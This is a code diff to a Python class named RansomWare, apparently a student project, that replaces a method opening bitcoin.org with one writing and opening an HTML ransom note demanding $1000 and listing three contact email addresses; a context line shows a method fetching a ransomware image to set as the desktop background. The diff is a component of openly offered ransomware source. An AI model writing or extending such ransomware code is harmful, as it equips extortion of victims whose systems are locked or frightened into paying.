@@ -127,9 +127,47 @@ class RansomWare:
 
     @staticmethod
     def what_is_bitcoin():
-        url = 'https://bitcoin.org'
-        # Open browser to the https://bitcoin.org so they know what bitcoin is
-        webbrowser.open(url)
+        # Define the file name
+        filename = 'ransom.html'
+
+        # Define some sample headings and contents
+        headings = ['Ransomware Execution']
+        contents = ['Your system is hacked! and the only way to unfreeze it is to pay ransom of $1000 USD to the '
+                    'following emails<br>'
+                    '<br>a00257491@mycambrian.ca'
+                    '<br>a00281563@mycambrian.ca'
+                    '<br>a00268573@mycambrian.ca']
+
+        image_path = r"C:\Users\Maaz\Documents\Python-Ransomware\bot.jpg"
+
+        # Create and write to the HTML file
+        with open(filename, 'w') as file:
+            file.write('<html>\n<head>\n<title>Random Content</title>\n')
+            # Add CSS to center content
+            file.write('<style>body { text-align: center; }</style>\n')
+            file.write('</head>\n<body>\n')
+
+            # Add image
+            file.write(f'<img src="{image_path}" alt="Ransomware" width="400" height="300">\n')
+
+            # Add random headings and contents
+            for heading, content in zip(headings, contents):
+                file.write(f'<h1>{heading}</h1>\n')
+                file.write(f'<p>{content}</p>\n')
+
+            file.write('</body>\n</html>')
+
+        # Get the absolute path of the file
+        abs_path = os.path.abspath(filename)
+
+        # Open in the default web browser
+        webbrowser.open(f'file://{abs_path}')
+
+    # @staticmethod
+    # def what_is_bitcoin():
+    #     url = 'https://bitcoin.org'
+    #     # Open browser to the https://bitcoin.org so they know what bitcoin is
+    #     webbrowser.open(url)
 
     def change_desktop_background(self):
         imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876' \
